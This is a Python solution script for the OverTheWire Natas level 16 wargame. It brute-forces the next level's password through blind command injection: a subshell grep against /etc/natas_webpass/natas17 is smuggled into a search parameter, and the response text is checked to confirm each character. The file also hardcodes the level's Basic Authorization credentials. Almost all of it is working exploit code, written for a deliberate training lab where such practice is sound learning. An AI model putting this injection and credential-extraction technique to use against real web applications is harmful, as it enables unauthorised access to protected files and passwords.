import requests
import string


URL = 'http://natas16.natas.labs.overthewire.org/index.php'
HEADERS = {'Authorization': 'Basic bmF0YXMxNjpUUkQ3aVpyZDVnQVRqajlQa1BFdWFPbGZFakhxajMyVg=='}
LETTERS = string.ascii_letters + string.digits

"""
    tou should replace the value of the header with your own credentials if natas passwords changes by the time you are seeing this
    to get the correct value just login to the level and go to inspect/network then refresh the page and find Authorization header in request
"""

password = ''

while len(password) != 32:
    for i in LETTERS:
        temp_password = password + i
        params = 'needle=$&submit=Search'
        params = {
            'needle': f'$( grep -e ^{temp_password} /etc/natas_webpass/natas17)',
            'submit':'Search'
        }
        not_found_letters = (31 - len(password)) * '-'
        print(' finding: ', password, f'[{i}]' ,not_found_letters , sep='', end='\r') 
        while True:
            try:
                response = requests.get(url=URL, headers=HEADERS, params=params)
                break
            except ConnectionResetError:
                print('connection reset Error Trying Again')
            except requests.exceptions.ConnectionError:
                print('connection Error Trying Again')
        if 'American' not in response.content.decode():
            password += i
            break

print(' \r \nFOUND ! ! !')
print('the password is :', password)
